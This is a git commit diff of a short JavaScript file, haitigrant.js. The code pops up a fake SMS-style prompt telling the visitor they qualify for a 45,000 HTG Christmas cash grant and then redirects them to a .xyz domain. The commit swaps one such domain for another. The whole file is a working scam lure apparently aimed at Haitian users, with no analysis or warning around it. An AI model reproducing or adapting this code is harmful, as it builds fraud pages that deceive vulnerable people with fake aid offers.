115c6c213a1ff4c141a3157af31c5d0175cd22d1
bigetijazz15 <bigetijazz15@gmail.com>
2024-11-28 17:11:30 -0800

    Update haitigrant.js

--- haitigrant.js
+++ haitigrant.js
@@ -2,5 +2,5 @@
 var password = 'RECLAMER 45,000 HTG'
 password=prompt('SMS: Félicitations, vous êtes admissible à ALIX DIDIER 45,000 HTG SUBVENTION EN ESPÈCES DE NOËL POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 45,000 HTG');
 if (password != 'RECLAMER 45,000 HTG') {
-location.href='https://www.xmas-season.xyz/45000HTG-subvention';
+location.href='https://www.xmas-subvention.xyz/Retirer-45000HTG';
 }
